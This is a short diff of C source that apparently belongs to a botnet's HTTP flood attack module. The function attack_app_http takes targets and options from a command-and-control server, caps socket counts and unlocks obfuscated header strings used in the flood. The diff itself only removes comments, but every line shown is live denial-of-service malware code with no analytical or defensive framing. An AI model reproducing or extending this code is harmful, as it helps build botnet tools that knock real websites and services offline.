@@ -48,9 +48,6 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
     if (util_strlen(method) > 9)
         return;
 
-    // BUT BRAH WHAT IF METHOD IS THE DEFAULT VALUE WONT IT SEGFAULT CAUSE READ ONLY STRING?
-    // yes it would segfault but we only update the values if they are not already uppercase.
-    // if the method is lowercase and its passed from the CNC we can update that memory no problem
     for (ii = 0; ii < util_strlen(method); ii++)
         if (method[ii] >= 'a' && method[ii] <= 'z')
             method[ii] -= 32;
@@ -58,7 +55,6 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
     if (sockets > HTTP_CONNECTION_MAX)
         sockets = HTTP_CONNECTION_MAX;
 
-    // unlock frequently used strings
     table_unlock_val(TABLE_ATK_SET_COOKIE);
     table_unlock_val(TABLE_ATK_REFRESH_HDR);
     table_unlock_val(TABLE_ATK_LOCATION_HDR);
